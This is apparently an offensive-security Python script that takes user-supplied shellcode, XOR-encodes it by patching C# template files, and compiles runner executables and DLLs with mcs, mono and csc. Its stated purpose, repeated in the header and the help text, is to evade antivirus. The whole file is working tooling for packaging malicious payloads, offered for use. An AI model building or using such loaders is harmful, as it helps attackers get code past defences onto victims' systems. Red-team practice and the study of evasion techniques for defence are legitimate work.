#!/usr/bin/python3

# Author: Jason Brewer
# Written for MacOS using mcs and mono to build and run C# || Same approach for Linux systems but requires download proper package(s)
# A python script written to help automate the process of compiling C# to evade AV 
# Version 1.0.0


import argparse
from subprocess import Popen,PIPE


# This function opens the C# file containing the xor code and modifies it in place
def placeCode():

	with open(args.file, 'r', encoding='utf-8') as fh:
		data = fh.readlines()

	data[13] = "\tbyte[] buf = new byte[{}]".format(args.size)
	data[14] = "{\n"+args.shellcode+"};\n\n"
  
	with open(args.file, 'w', encoding='utf-8') as fh:
    		fh.writelines(data)

	compileCode = "mcs {}".format(args.file)
	getCompiledExeName = compileCode.strip('.cs').strip('mcs')+".exe"
	runCmd = Popen(compileCode, shell=True, stdout=PIPE, universal_newlines=True)
	getValue = runCmd.communicate()[0]
	returnCode = runCmd.returncode
	if returnCode == 0:
		print("\n\n[+++] Compiled executable made -> {}\n\n".format(getCompiledExeName))
	else:
		print("\n[!!!] Something went wrong during compilation [!!!]\n")
		exit()

	# This runs the mono command on the newly generate xorme.exe file created above
	runCode = "mono {}".format(getCompiledExeName)
	runCmd = Popen(runCode, shell=True, stdout=PIPE, universal_newlines=True)
	getValue = runCmd.communicate()[0]
	returnCode = runCmd.returncode
	if returnCode == 0:
		print(getValue)
	else:
		print("\n[!!!] Something went wrong [!!!\n")
		exit()


# This function compiles the newly generated shellcode from the output as input
def runner():

	with open(args.runner, 'r', encoding='utf-8') as fh:
		data = fh.readlines()

	data[46] = "\tbyte[] buf = new byte[{}]".format(args.size)
	data[47] = "{\n"+args.shellcode+"};\n\n"
  
	with open(args.runner, 'w', encoding='utf-8') as fh:
    		fh.writelines(data)

	compileCode = "mcs {}".format(args.runner)
	runCmd = Popen(compileCode, shell=True, stdout=PIPE, universal_newlines=True)
	getValue = runCmd.communicate()[0]
	returnCode = runCmd.returncode
	if returnCode == 0:
		print("\n\n[+++] Compiled executable made -> {}.exe\n\n".format(compileCode.strip('.cs').strip('mcs')))
	else:
		print("\n[!!!] Something went wrong during compilation [!!!]\n")
		exit()
	

# For Dll xor encoder file
def Dllencoder():

	with open(args.dllencoder, 'r', encoding='utf-8') as fh:
		data = fh.readlines()

	data[10] = "\tbyte[] buf = new byte[{}]".format(args.size)
	data[11] = "{\n"+args.shellcode+"};\n\n"
  
	with open(args.dllencoder, 'w', encoding='utf-8') as fh:
    		fh.writelines(data)

	compileCode = "mcs {}".format(args.dllencoder)
	getCompiledExeName = compileCode.strip('.cs').strip('mcs')+".exe"
	runCmd = Popen(compileCode, shell=True, stdout=PIPE, universal_newlines=True)
	getValue = runCmd.communicate()[0]
	returnCode = runCmd.returncode
	if returnCode == 0:
		print("\n\n[+++] Compiled executable made -> {}.exe\n\n".format(compileCode.strip('.cs').strip('mcs')))
	else:
		print("\n[!!!] Something went wrong during compilation [!!!]\n")
		exit()
	

	runCode = "mono {}".format(getCompiledExeName)
	runCmd = Popen(runCode, shell=True, stdout=PIPE, universal_newlines=True)
	getValue = runCmd.communicate()[0]
	returnCode = runCmd.returncode
	if returnCode == 0:
		print(getValue)
	else:
		print("\n[!!!] Something went wrong [!!!\n")
		exit()


def Dllmaker():

	with open(args.dllmaker, 'r', encoding='utf-8') as fh:
		data = fh.readlines()

	data[35] = "\tbyte[] buf = new byte[{}]".format(args.size)
	data[36] = "{\n"+args.shellcode+"};\n\n"
  
	with open(args.dllmaker, 'w', encoding='utf-8') as fh:
    		fh.writelines(data)

	#/target:library /out:runner.dll runner.cs 
	compileCode = "csc /target:library /out:dllmaker.dll {}".format(args.dllmaker)
	runCmd = Popen(compileCode, shell=True, stdout=PIPE, universal_newlines=True)
	getValue = runCmd.communicate()[0]
	returnCode = runCmd.returncode
	if returnCode == 0:
		print("\n\n[+++] Compiled executable made -> dllmaker.dll\n\n")#.format(compileCode.strip('.cs').strip('mcs')))
	else:
		print("\n[!!!] Something went wrong during compilation [!!!]\n")
		exit()


# Main function handles argparse
def main():

	global args

	parser = argparse.ArgumentParser(description="A python script written to help automate the process of compiling C# to evade AV",
	usage="\nFor dll: ./xorCS.py -de <encoderDll.cs> -s size -Sc 'shellcode'"\
	"\nFor dll cont: ./xorCS.py -dm <createDll.cs> -s size -Sc 'new shellcode generated from above command'"\
	"\n\nFor exe: ./xorCS.py -f <xorme.cs> -s size -Sc 'shellcode'"\
	"\nFor exe cont: ./xorCS.py -r runner.cs -s size -Sc 'new shellcode generated from above command'")
	parser.add_argument('-de', dest='dllencoder', help='Use with the dll xor encoder file')
	parser.add_argument('-dm', dest='dllmaker', help='Use after running "-de dllFile -s size -Sc new-shellcode"')
	parser.add_argument('-f', dest='file', help='Input xor file i.e., xorme.cs')
	parser.add_argument('-r', dest='runner', help='This is the runner.cs file')
	parser.add_argument('-s', dest='size', help='Size of the shellcode')
	parser.add_argument('-Sc', dest='shellcode', help='Place shellcode within " "')
	args = parser.parse_args()

	if args.file and args.size and args.shellcode:
		placeCode()

	if args.runner and args.size and args.shellcode:
		runner()

	if args.dllencoder and args.size and args.shellcode:
		Dllencoder()
	
	if args.dllmaker and args.size and args.shellcode:
		Dllmaker()

if __name__ == '__main__':
	main()
